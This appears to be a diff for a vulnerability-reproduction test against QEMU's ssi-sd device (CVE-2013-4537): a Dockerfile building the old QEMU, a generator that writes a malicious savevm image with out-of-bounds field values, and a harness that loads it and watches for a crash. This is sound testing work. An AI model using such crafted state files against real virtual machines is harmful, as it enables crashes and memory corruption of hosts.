diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 00000000..023dc6aa
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,27 @@
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget python \
+    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \
+    libsdl1.2-dev libgtk-3-dev libaio-dev && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build QEMU with the vulnerable code
+RUN ./configure --target-list=i386-softmmu --disable-werror && \
+    make -j$(nproc)
+
+# Build the test programs
+RUN gcc -o test_exploit test_exploit.c && \
+    gcc -o test_vulnerability test_vulnerability.c
+
+# Run the test
+CMD ["./test_vulnerability"]
diff --git a/hw/sd/ssi-sd.c b/hw/sd/ssi-sd.c
index 3273c8a3..2261c3bf 100644
--- a/hw/sd/ssi-sd.c
+++ b/hw/sd/ssi-sd.c
@@ -13,6 +13,7 @@
 #include "sysemu/blockdev.h"
 #include "hw/ssi.h"
 #include "hw/sd.h"
+#include <stdio.h>
 
 //#define DEBUG_SSI_SD 1
 
@@ -216,6 +217,7 @@ static void ssi_sd_save(QEMUFile *f, void *opaque)
 
 static int ssi_sd_load(QEMUFile *f, void *opaque, int version_id)
 {
+    printf("[INSTRUMENTATION] ssi_sd_load");
     SSISlave *ss = SSI_SLAVE(opaque);
     ssi_sd_state *s = (ssi_sd_state *)opaque;
     int i;
diff --git a/test_exploit.c b/test_exploit.c
new file mode 100644
index 00000000..3b75f66f
--- /dev/null
+++ b/test_exploit.c
@@ -0,0 +1,75 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+// Define the constants we need
+#define SSI_SD_RESPONSE 2  // Mode for response state
+
+// Write a 32-bit big-endian value
+void write_be32(FILE *f, uint32_t val) {
+    uint8_t buf[4];
+    buf[0] = (val >> 24) & 0xFF;
+    buf[1] = (val >> 16) & 0xFF;
+    buf[2] = (val >> 8) & 0xFF;
+    buf[3] = val & 0xFF;
+    fwrite(buf, 1, 4, f);
+}
+
+// Write a string with length prefix
+void write_string(FILE *f, const char *str) {
+    size_t len = strlen(str);
+    write_be32(f, len);
+    fwrite(str, 1, len, f);
+}
+
+int main() {
+    FILE *f = fopen("exploit.bin", "wb");
+    if (!f) {
+        perror("Failed to open file");
+        return 1;
+    }
+
+    // Write QEMU savevm header
+    write_string(f, "QEMU");
+    write_be32(f, 1); // Version
+
+    // Write section header
+    fputc(1, f); // Section type (QEMU_VM_SECTION_FULL)
+    write_string(f, "ssi-sd"); // Device name
+    write_be32(f, 0); // Instance ID
+    write_be32(f, 1); // Version ID
+
+    // Write device state
+    write_be32(f, SSI_SD_RESPONSE); // s->mode = SSI_SD_RESPONSE (2)
+    write_be32(f, 0); // s->cmd
+    
+    // Write cmdarg (4 bytes)
+    for (int i = 0; i < 4; i++) {
+        write_be32(f, 0);
+    }
+    
+    // Write response (5 bytes)
+    for (int i = 0; i < 5; i++) {
+        write_be32(f, 0xAA);
+    }
+    
+    // Write arglen (vulnerable field)
+    write_be32(f, 0x1000); // Large value > 5
+    
+    // Write response_pos
+    write_be32(f, 6); // Greater than response array size (5)
+    
+    // Write stopping
+    write_be32(f, 0); // False
+    
+    // Write cs
+    write_be32(f, 0);
+
+    // Write section footer
+    fputc(0, f); // QEMU_VM_EOF
+
+    fclose(f);
+    printf("Created exploit.bin\n");
+    return 0;
+}
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 00000000..1f20c160
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,120 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <signal.h>
+
+/*
+ * Test for CVE-2013-4537 vulnerability in QEMU's ssi-sd.c
+ *
+ * This test creates a malicious savevm image with:
+ * 1. s->mode = SSI_SD_RESPONSE (2)
+ * 2. s->stopping = 0 (false)
+ * 3. s->arglen = 0x1000 (large value > 5)
+ * 4. s->response_pos = 6 (greater than response array size of 5)
+ *
+ * When loaded into a vulnerable QEMU, this will cause an out-of-bounds memory access
+ * in the ssi_sd_transfer function when it tries to access s->response[s->response_pos]
+ * where s->response_pos >= 5 (the size of the response array).
+ *
+ * The test returns:
+ * - 1 (FAIL) if the vulnerability exists (QEMU crashes)
+ * - 0 (PASS) if the vulnerability does not exist (QEMU handles the malicious input safely)
+ */
+
+int main() {
+    // Compile the exploit generator
+    if (system("gcc -o test_exploit test_exploit.c") != 0) {
+        fprintf(stderr, "Failed to compile test_exploit.c\n");
+        return 1;
+    }
+    
+    // Generate the exploit file
+    if (system("./test_exploit") != 0) {
+        fprintf(stderr, "Failed to generate exploit.bin\n");
+        return 1;
+    }
+    
+    // Create a VM image to test with
+    if (system("dd if=/dev/zero of=test.img bs=1M count=8 2>/dev/null") != 0) {
+        fprintf(stderr, "Failed to create test.img\n");
+        return 1;
+    }
+    
+    printf("Testing for CVE-2013-4537 vulnerability...\n");
+    
+    // Run QEMU with the SSI-SD device and try to load the malicious state
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Child process - run QEMU
+        // Redirect stdout and stderr to /dev/null
+        freopen("/dev/null", "w", stdout);
+        freopen("/dev/null", "w", stderr);
+        
+        // Execute QEMU with the SSI-SD device and load the exploit
+        execl("./i386-softmmu/qemu-system-i386", 
+              "qemu-system-i386",
+              "-device", "ssi-sd",
+              "-drive", "file=test.img,if=sd,index=0",
+              "-loadvm", "exploit.bin",
+              "-display", "none",
+              NULL);
+        
+        // If execl returns, it failed
+        perror("Failed to execute QEMU");
+        exit(1);
+    } else if (pid > 0) {
+        // Parent process - wait for child with timeout
+        int status;
+        int timeout = 5; // 5 seconds timeout
+        
+        // Wait for the child process to complete or timeout
+        while (timeout > 0) {
+            pid_t result = waitpid(pid, &status, WNOHANG);
+            if (result == pid) {
+                // Child process completed
+                if (WIFEXITED(status)) {
+                    int exit_code = WEXITSTATUS(status);
+                    printf("QEMU exited with code: %d\n", exit_code);
+                    if (exit_code != 0) {
+                        printf("VULNERABILITY DETECTED: QEMU crashed when loading malicious savevm image\n");
+                        return 1; // Test FAILS if vulnerability exists (QEMU crashes)
+                    }
+                } else if (WIFSIGNALED(status)) {
+                    int signal = WTERMSIG(status);
+                    printf("VULNERABILITY DETECTED: QEMU terminated by signal %d\n", signal);
+                    return 1; // Test FAILS if vulnerability exists (QEMU crashes)
+                }
+                break;
+            } else if (result == 0) {
+                // Child still running, wait a bit
+                sleep(1);
+                timeout--;
+            } else {
+                // Error in waitpid
+                perror("waitpid");
+                kill(pid, SIGKILL); // Kill the child process
+                return 1;
+            }
+        }
+        
+        if (timeout == 0) {
+            // Timeout occurred, kill the child process
+            printf("QEMU is still running after timeout, killing it\n");
+            kill(pid, SIGKILL);
+            waitpid(pid, NULL, 0); // Clean up zombie process
+            printf("VULNERABILITY NOT DETECTED: QEMU did not crash within timeout period\n");
+            return 0; // Test PASSES if QEMU doesn't crash
+        }
+        
+        printf("VULNERABILITY NOT DETECTED: QEMU handled malicious savevm image safely\n");
+        return 0; // Test PASSES if vulnerability doesn't exist (QEMU doesn't crash)
+    } else {
+        perror("Failed to fork");
+        return 1;
+    }
+    
+    return 0; // Default to pass
+}
